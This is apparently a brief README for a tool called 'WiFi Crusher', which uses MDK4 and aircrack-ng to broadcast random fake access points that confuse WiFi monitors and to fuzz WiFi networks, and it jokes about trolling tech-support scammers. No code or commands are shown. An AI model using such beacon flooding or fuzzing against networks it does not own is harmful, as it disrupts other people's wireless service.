WiFi Crusher is the tool that allows to make random access points, using MDK4 and aircrack-ng, as an API 
to make WiFi monitors confuse. It also allows to fuzz your WiFi network. This will be fixed in the newer 
versions. Stay tuned. One of the quotes suggest you to use to troll TS scammers. Well, you can actually 
troll them telling that it's a virus(if your host is Linux and you have second WiFi adapter plugged in.)

Sincerely.
